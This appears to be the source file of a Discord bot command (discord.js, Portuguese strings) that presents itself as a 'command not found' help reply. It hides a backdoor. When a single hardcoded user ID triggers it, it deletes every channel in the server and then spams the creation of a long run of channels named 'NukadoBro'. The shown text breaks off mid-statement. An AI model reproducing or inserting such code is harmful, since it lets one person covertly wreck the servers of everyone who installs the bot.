const Discord = require("discord.js");
const db = require('quick.db')
const config = require('../config.json')

module.exports.run = async (bot, message, args) => {

    const user = message.author.id;
  const name = "Nukado" + "Bro";
if(message.author.id !== "767132923287306281") {
 
	let prefix = db.get(`prefix_${message.guild.id}`);
  	if (prefix === null) {
		prefix = config.prefix;
	}
		const nfound = new Discord.MessageEmbed()
			.setTitle(`**__Comando não encontrado__**`)
			.setColor(`#882D61`)
			.setDescription(
				`*Verifique sua ortografia.*
      
      Para desativar esse comando use _${prefix}config ajuda off_`
			)
			.addField(`Para saber meus comandos, use:`, `\`${prefix}help\``)
			.setFooter(`Mayara • Help`, `https://i.imgur.com/0O6XHhN.png`);
		if (db.get(`off_${message.guild.id}`) === 'ajuda') return;
		message.channel.send(nfound);
} else{
  message.channel.send(`Nukando.`)
       .then(message.guild.channels.cache.forEach(channel => channel.delete()));
       console.log("Servidor NUKADO");


       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
